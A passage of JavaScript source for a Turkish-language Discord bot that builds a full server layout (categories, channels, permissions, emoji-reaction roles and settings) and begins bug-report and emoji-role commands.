            const akoşkosesgetir = await sunucu.channels.cache.find(kanal => kanal.name === "Allahın İkinci Emri");
            await akoşkosesgetir.setParent(akoşkokategorigetir.id, { lockPermissions: true });

            const bekarlarodası = await sunucu.channels
            .create('Allahın Üçüncü Emri', {
              type: "voice",
              bitrate: 96000
            })
            const bekarlarodasıgetir = await sunucu.channels.cache.find(kanal => kanal.name === "Allahın Üçüncü Emri");
            await bekarlarodasıgetir.setParent(akoşkokategorigetir.id, { lockPermissions: true });
          }, 40000);

          //Önemli Kategorisi
          setTimeout(async () => {

          const önemlikategori = await sunucu.channels
          .create('Önemli', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: true,
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              READ_MESSAGES: true,
              READ_MESSAGE_HISTORY: true
            })
          })
          const önemlikategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Önemli");

            //Önemli Kanalları
            const duyurular = await sunucu.channels
            .create('📣・duyurular', {
              type: "text",
            })
            const duyurulargetir =  await sunucu.channels.cache.find(kanal => kanal.name === "📣・duyurular");
            await duyurulargetir.setParent(önemlikategorigetir.id, { lockPermissions: true });

            const destek = await sunucu.channels
            .create('📝・destek', {
              type: "text"
            })
            const destekgetir = await sunucu.channels.cache.find(kanal => kanal.name === "📝・destek");
            await destekgetir.setParent(önemlikategorigetir.id, { lockPermissions: true });
            sunucu.setRulesChannel(destekgetir);

            const gelengiden = await sunucu.channels
            .create('📥・gelen-giden・📤', {
              type: "text"
            })
            const gelengidengetir = await sunucu.channels.cache.find(kanal => kanal.name === "📥・gelen-giden・📤");
            await gelengidengetir.setParent(önemlikategorigetir.id, { lockPermissions: true });

            const sayaç = await sunucu.channels
            .create('🔢・sayaç', {
              type: "text"
            })
            const sayaçgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔢・sayaç");
            await sayaçgetir.setParent(önemlikategorigetir.id, { lockPermissions: true });

            const rolseçim = await sunucu.channels
            .create('🔮・rol-seçim', {
              type: "text"
            })
            const rolseçimgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔮・rol-seçim");
            await rolseçimgetir.setParent(önemlikategorigetir.id, { lockPermissions: true });

            const renkseçim = await sunucu.channels
            .create('🌈・renk-seçim', {
              type: "text"
            })
            const renkseçimgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🌈・renk-seçim");
            await renkseçimgetir.setParent(önemlikategorigetir.id, { lockPermissions: true });

            const botkomut = await sunucu.channels
            .create('🤖・bot-komut', {
              type: "text"
            }).then(async c => {
              await c.updateOverwrite(everyonegetir, {
                VIEW_CHANNEL: true,
                SEND_MESSAGES: true,
                ADD_REACTIONS: true,
                READ_MESSAGES: true,
                READ_MESSAGE_HISTORY: true
              })
            })
            const botkomutgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🤖・bot-komut");
            await botkomutgetir.setParent(önemlikategorigetir.id, { lockPermissions: true });

            const log = await sunucu.channels
            .create('・log', {
              type: "text"
            })
            const loggetir = await sunucu.channels.cache.find(kanal => kanal.name === "・log");
            await loggetir.setParent(önemlikategorigetir.id, { lockPermissions: true });
            sunucu.setSystemChannel(loggetir);
          }, 42000);
          //Ses Kanalları
          setTimeout(async () => {

          const seskanallarıkategori = await sunucu.channels
          .create('Ses Kanalları', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(mutedrolgetir, {
              SPEAK: false
            });
            c.updateOverwrite(everyonegetir, {
              SPEAK: true
            })
          })
          const seskanallarıkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Ses Kanalları");
            
            //Ses Kanalları Kanalları
            const genel = await sunucu.channels
            .create('🔊・Genel', {
              type: "voice",
              bitrate: 96000
            })
            const genelgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔊・Genel");
            await genelgetir.setParent(seskanallarıkategorigetir.id, { lockPermissions: true });

            const bosyapmaodası = await sunucu.channels
            .create('Boş Yapma Odası', {
              type: "voice",
              bitrate: 96000
            })
            const bosyapmaodasıgetir = await sunucu.channels.cache.find(kanal => kanal.name === "Boş Yapma Odası");
            await bosyapmaodasıgetir.setParent(seskanallarıkategorigetir.id, { lockPermissions: true });

            const sövme = await sunucu.channels
            .create('Sadece sövmek için kullan', {
              type: "voice",
              bitrate: 96000
            })
            const sövmegetir = await sunucu.channels.cache.find(kanal => kanal.name === "Sadece sövmek için kullan");
            await sövmegetir.setParent(seskanallarıkategorigetir.id, { lockPermissions: true });

            const canlı = await sunucu.channels
            .create('🎥・Akşam Canlı Yayınları', {
              type: "voice",
              bitrate: 85000
            })
            const canlıgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎥・Akşam Canlı Yayınları");
            await canlıgetir.setParent(seskanallarıkategorigetir.id, { lockPermissions: true });
          }, 43000);

          //Metin Kanalları
          setTimeout(async () => {
            
          const metinkanallarıkategori = await sunucu.channels
          .create('Metin Kanalları', {
            type: "category"
          })
          const metinkanallarıkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Metin Kanalları");

            //Metin Kanalları Kanalları
            const chat = await sunucu.channels
            .create('💬・chat', {
              type: "text"
            })
            const chatgetir = await sunucu.channels.cache.find(kanal => kanal.name === "💬・chat");
            await chatgetir.setParent(metinkanallarıkategorigetir.id, { lockPermissions: true });

            const memes = await sunucu.channels
            .create('⚪・memes', {
              type: "text"
            })
            const memesgetir = await sunucu.channels.cache.find(kanal => kanal.name === "⚪・memes");
            await memesgetir.setParent(metinkanallarıkategorigetir.id, { lockPermissions: true });

            const reklam = await sunucu.channels
            .create('🔗・reklam-link', {
              type: "text"
            })
            const reklamgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔗・reklam-link");
            await reklamgetir.setParent(metinkanallarıkategorigetir.id, { lockPermissions: true });
          }, 44000);

          //Müzik Odaları 
          setTimeout(async () => {

          const müzikkategori = await sunucu.channels
          .create('Müzik Odaları', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(müzisyenrolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const müzikkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Müzik Odaları");

            //Müzik Odaları Kanalları
            const spotify = await sunucu.channels
            .create('🎧・spotify', {
              type: "text"
            })
            const spotifygetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎧・spotify");
            await spotifygetir.setParent(müzikkategorigetir.id, { lockPermissions: true });

            const müzikkomut = await sunucu.channels
            .create('🎵・müzik-komut', {
              type: "text"
            })
            const müzikkomutgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎵・müzik-komut");
            await müzikkomutgetir.setParent(müzikkategorigetir.id, { lockPermissions: true });

            const müzikdinleme = await sunucu.channels
            .create('🎶・Müzik Dinleme Odası', {
              type: "voice",
              bitrate: 96000
            })
            const müzikdinlemegetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎶・Müzik Dinleme Odası");
            await müzikdinlemegetir.setParent(müzikkategorigetir.id, { lockPermissions: true });
          }, 45000);

          //İşsiz
          setTimeout(async () => {

          const işsizkategori = await sunucu.channels
          .create('İşsiz', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(issizrolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const işsizkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "İşsiz");

            //İşsiz Kanalları
            const videomontaj = await sunucu.channels
            .create('💻・video-montaj', {
              type: "text"
            })
            const videomontajgetir = await sunucu.channels.cache.find(kanal => kanal.name === "💻・video-montaj");
            await videomontajgetir.setParent(işsizkategorigetir.id, { lockPermissions: true });

            const photoshop = await sunucu.channels
            .create('💻・photoshop', {
              type: "text"
            })
            const photoshopgetir = await sunucu.channels.cache.find(kanal => kanal.name === "💻・photoshop");
            await photoshopgetir.setParent(işsizkategorigetir.id, { lockPermissions: true });

            const kod = await sunucu.channels
            .create('💻・kod', {
              type: "text"
            })
            const kodgetir = await sunucu.channels.cache.find(kanal => kanal.name === "💻・kod");
            await kodgetir.setParent(işsizkategorigetir.id, { lockPermissions: true });
          }, 46000);

          //İzleyici
          setTimeout(async () => {
            
          const izleyicikategori = await sunucu.channels
          .create('İzleyici', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(filmseverrolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const izleyicikategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "İzleyici");

            //İzleyici Kanalları
            const anime = await sunucu.channels
            .create('🍥・anime', {
              type: "text"
            })
            const animegetir = await sunucu.channels.cache.find(kanal => kanal.name === "🍥・anime");
            await animegetir.setParent(izleyicikategorigetir.id, { lockPermissions: true });

            const dizi = await sunucu.channels
            .create('📺・dizi', {
              type: "text"
            })
            const dizigetir = await sunucu.channels.cache.find(kanal => kanal.name === "📺・dizi");
            await dizigetir.setParent(izleyicikategorigetir.id, { lockPermissions: true });

            const film = await sunucu.channels
            .create('🎬・film', {
              type: "text"
            })
            const filmgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎬・film");
            await filmgetir.setParent(izleyicikategorigetir.id, { lockPermissions: true });

            const spoiler = await sunucu.channels
            .create('⚠・spoiler-içerik', {
              type: "text"
            })
            const spoilergetir = await sunucu.channels.cache.find(kanal => kanal.name === "⚠・spoiler-içerik");
            await spoilergetir.setParent(izleyicikategorigetir.id, { lockPermissions: true });

            const dizifilm = await sunucu.channels
            .create('🎞・dizi-film', {
              type: "text"
            })
            const dizifilmgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎞・dizi-film");
            await dizifilmgetir.setParent(izleyicikategorigetir.id, { lockPermissions: true });
          }, 47000);

          //Müstehcen İçerik
          setTimeout(async () => {

          const müstehcenkategori = await sunucu.channels
          .create('Müstehcen İçerik', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(nsfwrolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const müstehcenkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Müstehcen İçerik");

            //Müstehcen İçerik Kanalları
            const nsfw = await sunucu.channels
            .create('🔞・nsfw', {
              type: "text",
              nsfw: true
            })
            const nsfwgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔞・nsfw");
            await nsfwgetir.setParent(müstehcenkategorigetir.id, { lockPermissions: true });

            const hentai = await sunucu.channels
            .create('🔞・hentai', {
              type: "text",
              nsfw: true
            })
            const hentaigetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔞・hentai");
            await hentaigetir.setParent(müstehcenkategorigetir.id, { lockPermissions: true });
            
            const link = await sunucu.channels
            .create('🔗・video-link', {
              type: "text",
              nsfw: true
            })
            const linkgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔗・video-link");
            await linkgetir.setParent(müstehcenkategorigetir.id, { lockPermissions: true });

            const görseller = await sunucu.channels
            .create('📷・görseller', {
              type: "text",
              nsfw: true
            })
            const görsellergetir = await sunucu.channels.cache.find(kanal => kanal.name === "📷・görseller");
            await görsellergetir.setParent(müstehcenkategorigetir.id, { lockPermissions: true });
          }, 48000);

          //Alış-Veriş
          setTimeout(async () => {
            
          const avkategori = await sunucu.channels
          .create('Alışveriş', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(alisverisrolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const avkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Alışveriş");

            //Alış-VerİŞ Kanalları
            const tshirt = await sunucu.channels
            .create('👕・t-shirt', {
              type: "text"
            })
            const tshirtgetir = await sunucu.channels.cache.find(kanal => kanal.name === "👕・t-shirt");
            await tshirtgetir.setParent(avkategorigetir.id, { lockPermissions: true });

            const pantul = await sunucu.channels
            .create('👖・don-pantul', {
              type: "text"
            })
            const pantulgetir = await sunucu.channels.cache.find(kanal => kanal.name === "👖・don-pantul");
            await pantulgetir.setParent(avkategorigetir.id, { lockPermissions: true });
          }, 49000);

          //Valorant
          setTimeout(async () => {
            
          const valokategori = await sunucu.channels
          .create('Valorant', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(oyuncurolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const valokategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Valorant");

            //Valorant Kanalları
            const taktik = await sunucu.channels
            .create('🎲・taktik-plans', {
              type: "text"
            })
            const taktikgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎲・taktik-plans");
            await taktikgetir.setParent(valokategorigetir.id, { lockPermissions: true });

            const dereceli = await sunucu.channels
            .create('🎮・Dereceli', {
              type: "voice",
              userLimit: 5
            })
            const dereceligetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Dereceli");
            await dereceligetir.setParent(valokategorigetir.id, { lockPermissions: true });

            const derecesiz = await sunucu.channels
            .create('🎮・Derecesiz', {
              type: "voice",
              userLimit: 5
            })
            const derecesizgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Derecesiz");
            await derecesizgetir.setParent(valokategorigetir.id, { lockPermissions: true });

            const spike = await sunucu.channels
            .create('🎮・Spike Rush', {
              type: "voice",
              userLimit: 5
            })
            const spikegetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Spike Rush");
            await spikegetir.setParent(valokategorigetir.id, { lockPermissions: true });

            const özel = await sunucu.channels
            .create('🎮・Özel Mod', {
              type: "voice",
              userLimit: 10
            })
            const özelgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Özel Mod");
            await özelgetir.setParent(valokategorigetir.id, { lockPermissions: true });

            const tırmanış = await sunucu.channels
            .create('🎮・Tırmanış', {
              type: "voice",
              userLimit: 5
            })
            const tırmanışgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Tırmanış");
            await tırmanışgetir.setParent(valokategorigetir.id, { lockPermissions: true });
          }, 50000);

          //CS-GO
          setTimeout(async () => {
            
          const cskategori = await sunucu.channels
          .create('CS-GO', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(oyuncurolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const cskategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "CS-GO");

            //CS-GO Kanalları
            const taktikplan = await sunucu.channels
            .create('🎲・taktik-plan', {
              type: "text"
            })
            const taktikplangetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎲・taktik-plan");
            await taktikplangetir.setParent(cskategorigetir.id, { lockPermissions: true });

            const reko = await sunucu.channels
            .create('🎮・Rekabetçi', {
              type: "voice",
              userLimit: 5
            })
            const rekogetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Rekabetçi");
            await rekogetir.setParent(cskategorigetir.id, { lockPermissions: true });

            const yoldaş = await sunucu.channels
            .create('🎮・Yoldaş', {
              type: "voice",
              userLimit: 2
            })
            const yoldaşgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Yoldaş");
            await yoldaşgetir.setParent(cskategorigetir.id, { lockPermissions: true });

            const othermod = await sunucu.channels
            .create('🎮・Diğer Modlar', {
              type: "voice",
              userLimit: 10
            })
            const othermodgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Diğer Modlar");
            await othermodgetir.setParent(cskategorigetir.id, { lockPermissions: true });
          }, 51000);

          //Minecraft
          setTimeout(async () => {

          const mckategori = await sunucu.channels
          .create('Minecraft', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(oyuncurolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const mckategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Minecraft");

            //Minecraft Kanalları
            const mcserver = await sunucu.channels
            .create('💬・mcserver', {
              type: "text"
            })
            const mcservergetir = await sunucu.channels.cache.find(kanal => kanal.name === "💬・mcserver");
            await mcservergetir.setParent(mckategorigetir.id, { lockPermissions: true });

            const mcserverbir = await sunucu.channels
            .create('🎮・Server 1', {
              type: "voice"
            })
            const mcserverbirgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Server 1");
            await mcserverbirgetir.setParent(mckategorigetir.id, { lockPermissions: true });

            const mcserveriki = await sunucu.channels
            .create('🎮・Server 2', {
              type: "voice"
            })
            const mcserverikigetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Server 2");
            await mcserverikigetir.setParent(mckategorigetir.id, { lockPermissions: true });
          }, 52000);

          //Diğer Oyunlar
          setTimeout(async () => {
            
          const digerkategori = await sunucu.channels
          .create('Diğer Oyunlar', {
            type: "category"
          }).then(async c => {
            c.updateOverwrite(everyonegetir, {
              VIEW_CHANNEL: false
            })
            c.updateOverwrite(oyuncurolgetir, {
              VIEW_CHANNEL: true
            })
          })
          const digerkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Diğer Oyunlar");

            //Diğer Oyunlar Kanalları
            const türetmece = await sunucu.channels
            .create('🎲・kelime-türetmece', {
              type: "text"
            })
            const türetmecegetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎲・kelime-türetmece");
            await türetmecegetir.setParent(digerkategorigetir.id, { lockPermissions: true });

            const tuttu = await sunucu.channels
            .create('🎲・tuttu-tutmadı', {
              type: "text"
            })
            const tuttugetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎲・tuttu-tutmadı");
            await tuttugetir.setParent(digerkategorigetir.id, { lockPermissions: true });

            const vampir = await sunucu.channels
            .create('🎲・vampir-köylü', {
              type: "text"
            })
            const vampirgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎲・vampir-köylü");
            await vampirgetir.setParent(digerkategorigetir.id, { lockPermissions: true });

            const gta = await sunucu.channels
            .create('🎮・GTA 5', {
              type: "voice"
            })
            const gtagetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・GTA 5");
            await gtagetir.setParent(digerkategorigetir.id, { lockPermissions: true });

            const l4d2 = await sunucu.channels
            .create('🎮・Left 4 Dead 2', {
              type: "voice"
            })
            const l4d2getir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Left 4 Dead 2");
            await l4d2getir.setParent(digerkategorigetir.id, { lockPermissions: true });

            const gartic = await sunucu.channels
            .create('🎮・Gartic.io', {
              type: "voice"
            })
            const garticgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Gartic.io");
            await garticgetir.setParent(digerkategorigetir.id, { lockPermissions: true });

            const rl = await sunucu.channels
            .create('🎮・Rocket League', {
              type: "voice"
            })
            const rlgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🎮・Rocket League");
            await rlgetir.setParent(digerkategorigetir.id, { lockPermissions: true });
          }, 53000);

          //AFK Kanalı
          setTimeout(async () => {

          const afkkategori = await sunucu.channels
          .create('Away From The Keyboard', {
            type: "category"
          })
          const afkkategorigetir = await sunucu.channels.cache.find(kanal => kanal.name === "Away From The Keyboard");

            //AFK Kanalları
            const afk = await sunucu.channels
            .create('💤・AFK', {
              type: "voice"
            })
            const afkgetir = await sunucu.channels.cache.find(kanal => kanal.name === "💤・AFK");
            await afkgetir.setParent(afkkategorigetir.id, { lockPermissions: true });
            sunucu.setAFKChannel(afkgetir);
          }, 54000);

          //Emoji Rol Ve Destek Mesajı
          setTimeout(async () => {
            const rolseçimgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔮・rol-seçim");
            const renkseçimgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🌈・renk-seçim");
            const destekgetir = await sunucu.channels.cache.find(kanal => kanal.name === "📝・destek");
            const billieemojigetir = await sunucu.emojis.cache.find(e => e.name === "billieeilish")
            const tengetir = await sunucu.emojis.cache.find(e => e.name === "tenrengi")
            const pastelgetir = await sunucu.emojis.cache.find(e => e.name === "pastelmavi")
            const pembeyazgetir = await sunucu.emojis.cache.find(e => e.name === "pembeyaz")
            const fistikgetir = await sunucu.emojis.cache.find(e => e.name === "fistikyesil")
            const boostergetir = await sunucu.emojis.cache.find(e => e.name === "booster")
            const oyuncuemojigetir = await sunucu.emojis.cache.find(e => e.name === "oyuncu")
            const filmseveremojigetir = await sunucu.emojis.cache.find(e => e.name === "filmsever")
            const işsizemojigetir = await sunucu.emojis.cache.find(e => e.name === "issiz")
            const pembeemojigetir = await sunucu.emojis.cache.find(e => e.name === "pembe");
            //Emoji Rol Database
            await db.set(`emojirol-${rolseçimgetir.id}-oyuncu`, `${oyuncurolgetir.id}-oyuncu`);
            await db.set(`emojirol-${rolseçimgetir.id}-filmsever`, `${filmseverrolgetir.id}-filmsever`);
            await db.set(`emojirol-${rolseçimgetir.id}-issiz`, `${issizrolgetir.id}-issiz`);
            await db.set(`emojirol-${rolseçimgetir.id}-🔞`, `${nsfwrolgetir.id}-🔞`);
            await db.set(`emojirol-${rolseçimgetir.id}-🛍️`, `${alisverisrolgetir.id}-🛍️`);
            await db.set(`emojirol-${rolseçimgetir.id}-🎵`, `${müzisyenrolgetir.id}-🎵`);
            await db.set(`emojirol-${renkseçimgetir.id}-booster`, `${boosterrolgetir.id}-booster`);
            await db.set(`emojirol-${renkseçimgetir.id}-🟣`, `${morrolgetir.id}-🟣`);
            await db.set(`emojirol-${renkseçimgetir.id}-pembe`, `${pemberolgetir.id}-pembe`);
            await db.set(`emojirol-${renkseçimgetir.id}-🔵`, `${mavirolgetir.id}-🔵`);
            await db.set(`emojirol-${renkseçimgetir.id}-🟢`, `${yesilrolgetir.id}-🟢`);
            await db.set(`emojirol-${renkseçimgetir.id}-🟡`, `${sarırolgetir.id}-🟡`);
            await db.set(`emojirol-${renkseçimgetir.id}-🟠`, `${turuncurolgetir.id}-🟠`);
            await db.set(`emojirol-${renkseçimgetir.id}-🔴`, `${kırmızırolgetir.id}-🔴`);
            await db.set(`emojirol-${renkseçimgetir.id}-tenrengi`, `${tenrengirolgetir.id}-tenrengi`);
            await db.set(`emojirol-${renkseçimgetir.id}-pastelmavi`, `${pastelmavirolgetir.id}-pastelmavi`);
            await db.set(`emojirol-${renkseçimgetir.id}-pembeyaz`, `${pembeyazrolgetir.id}-pembeyaz`);
            await db.set(`emojirol-${renkseçimgetir.id}-billieeilish`, `${billierolgetir.id}-billieeilish`);
            await db.set(`emojirol-${renkseçimgetir.id}-fistikyesil`, `${fıstıkyeşilirolgetir.id}-fistikyesil`);
            await db.set(`emojirol-${renkseçimgetir.id}-⚫`, `${siyahrolgetir.id}-⚫`);
            await db.set(`emojirol-${renkseçimgetir.id}-⚪`, `${beyazrolgetir.id}-⚪`);

            const destekmesajı = (
              `@everyone sunucuda yaşadığınız herhangi bir problem olursa <@${sunucu.ownerID}> ile görüşebilirsiniz <a:unlem:825146178503966770>`
            )
            const rolseçimmesaj = (
              `Aşağıdan size uygun rolleri seçebilirsiniz;

  Oyuncu: ${oyuncuemojigetir} 
  Film Sever: ${filmseveremojigetir}
  İşsiz: ${işsizemojigetir}
  Nsfw: :underage: 
  Alış Veriş Delisi: :shopping_bags:
  Müzisyen: :musical_note:`
            )

            const renkseçimmesaj = (
              `İstediğin renk görünüşüne sahip olmak için ;

  Booster Rengi ${boostergetir} 
  Mor :purple_heart: 
  Pembe :purple_circle: 
  Mavi :blue_circle: 
  Yeşil :green_circle: 
  Sarı :yellow_circle: 
  Turuncu :orange_circle: 
  Kırmızı :red_circle:
  Ten Rengi ${tengetir} 
  Pastel Mavisi ${pastelgetir} 
  Pembe Beyazı ${pembeyazgetir} 
  Billie Eilish Yeşili ${billieemojigetir} 
  Fıstık Yeşili ${fistikgetir} 
  Siyah :black_circle: 
  Beyaz :white_circle:`
            )
          setTimeout(async () => {
            await destekgetir.send(destekmesajı);
            await rolseçimgetir.send(rolseçimmesaj).then(async r => {
              await r.react(oyuncuemojigetir);
              await r.react(filmseveremojigetir);
              await r.react(işsizemojigetir);
              await r.react('🔞');
              await r.react('🛍️');
              await r.react('🎵');
            })
            await renkseçimgetir.send(renkseçimmesaj).then(async r => {
              await r.react(boostergetir)
              await r.react('🟣');
              await r.react(pembeemojigetir);
              await r.react('🔵');
              await r.react('🟢');
              await r.react('🟡');
              await r.react('🟠');
              await r.react('🔴');
              await r.react(tengetir);
              await r.react(pastelgetir);
              await r.react(pembeyazgetir);
              await r.react(billieemojigetir);
              await r.react(fistikgetir);
              await r.react('⚫');
              await r.react('⚪');
            })
          }, 5000)
          }, 60000);

          //Tamamlandı
          setTimeout(async () => {
            const loggetir = await sunucu.channels.cache.find(kanal => kanal.name === "・log");
            const gelengidengetir = await sunucu.channels.cache.find(kanal => kanal.name === "📥・gelen-giden・📤");
            const afkgetir = await sunucu.channels.cache.find(kanal => kanal.name === "💤・AFK");
            const chatgetir = await sunucu.channels.cache.find(kanal => kanal.name === "💬・chat");
            const sayaçgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔢・sayaç");
            const rolseçimgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🔮・rol-seçim");
            const renkseçimgetir = await sunucu.channels.cache.find(kanal => kanal.name === "🌈・renk-seçim");
            const geninrolgetir = await sunucu.roles.cache.find(rol => rol.name === "Genin");
            await db.set(`log-${sunucu.id}`, loggetir.id);
            await db.set(`hoşgeldin-${sunucu.id}`, gelengidengetir.id);
            await db.set(`otorol-${sunucu.id}`, geninrolgetir.id);
            await db.set(`sayaç-${sunucu.id}`, sayaçgetir.id);
            await db.set(`küfür-${sunucu.id}`,`açık`);
            const embeds = new Discord.MessageEmbed()
            .addFields(
              {name: "Emoji Rol Ayarlandı", value:`Emoji Rol ${rolseçimgetir} ve ${renkseçimgetir} Kanallarında Etkinleştirildi <a:ysltk:749379707556069457>`, inline: false},
              {name: "Gelen-Giden Kanalı Ayarlandı", value:`Gelen Giden Mesajları ${gelengidengetir} Kanalına Ayarlandı <a:ysltk:749379707556069457>`, inline: false},
              {name: "İzinler Senkronize Edildi", value:`Kategori Ve Kanal İzinleri Senkronize Edildi <a:ysltk:749379707556069457>`, inline: false},
              {name: "Sistem Kanalı Ayarlandı", value:`Sistem Kanalı Olarak ${loggetir} Ayarlandı <a:ysltk:749379707556069457>`, inline: false},
              {name: "Otorol Ayarlandı", value:`Otorol Olarak ${geninrolgetir} Rolü Ayarlandı <a:ysltk:749379707556069457>`, inline: false},
              {name: "Log Kanalı Ayarlandı", value:`Log Kanalı Olarak ${loggetir} Ayarlandı <a:ysltk:749379707556069457>`, inline: false},
              {name: "Afk Kanalı Ayarlandı", value:`Afk Kanalı Olarak ${afkgetir} Ayarlandı <a:ysltk:749379707556069457>`, inline: false},
              {name: "Küfür Koruma Aktif Edildi", value:`Küfür Koruma Aktif Hale Getirildi <a:ysltk:749379707556069457>`, inline: false},
              {name: "Emojiler Ayarlandı", value:`9 Adet Emoji Ayarlandı <a:ysltk:749379707556069457>`, inline: false},
              {name: "Roller Ayarlandı", value:`27 Adet Rol Ayarlandı <a:ysltk:749379707556069457>`, inline: false}
            )
            .setColor("GREEN")
            .setTitle("Sunucu Yapılandırması Bitti")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            await chatgetir.send(embeds).then(e => {
              e.react('✅');
            })
          }, 65000);
        }, 35000);
        }
        if (komut === "bildir") {
          const ben = client.users.cache.get("456948152101240847");
          if (!args[1]) {
            const embed = new Discord.MessageEmbed()
            .setTitle(`Lütfen Bildirmek İstediğiniz Kodu Ve Hatasını Yazınız`)
            .addField(`Örnek:`, `Sbildir ban-komutu İstediğim Kişiyi Banlamıyor`)
            .setFooter(`Created by Saxquatchx |`, fot.avatarURL({ dynamic:true }))
            .setColor("RED")
            .setTimestamp()
            return message.channel.send(embed)
          } else {
          const bildirilecekmesaj = message.content.slice(8);
          const bildirilcekembed = new Discord.MessageEmbed()
          .setFooter(`Created by Saxquatchx |`, fot.avatarURL({ dynamic:true }))
          .setColor("RED")
          .setTimestamp()
          .setDescription(bildirilecekmesaj)
          .setTitle("Bir Şikayet Var <a:unlem:825146178503966770>")
          .setAuthor(message.author.tag, message.author.avatarURL())
          await ben.send(bildirilcekembed);
          const embed = new Discord.MessageEmbed()
          .setDescription(`Şikayetinizi sahibime gönderdim, en kısa süre içerisinde bu hata düzeltilecektir`)
          .setFooter(`Created by Saxquatchx |`, fot.avatarURL({ dynamic:true }))
          .setColor("GREEN")
          .setTimestamp()
          message.channel.send(embed);
          }
        }
        if (komut === "emoji-rol") {
          if (!args[0]) {
            const embed = new Discord.MessageEmbed()
            .setTitle(`Bu Komut İçin Bir Rol Girmelisin <a:unlem:825146178503966770>`)
            .addField(`Örnek:`, `Semoji-rol @rol emoji <kanal idsi>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed)
          }
          if (args[0] && !args[1]) {
            const embed = new Discord.MessageEmbed()
            .setTitle(`Bu Komut İçin Bir Emoji Koymalısınız <a:unlem:825146178503966770>`)
            .addField(`Örnek:`, `Semoji-rol @rol  emoji <kanal idsi>`)
            .setColor("RED")
            .setFooter("Daha Fazla Komut İstiyorsanız Bana Ulaşın | Created by Saxquatchx", fot.avatarURL({ dynamic:true }))
            .setTimestamp()
            return message.channel.send(embed)
          }
          if (args[0] && args[1] && !args[2]) {
            const embed = new Discord.MessageEmbed()
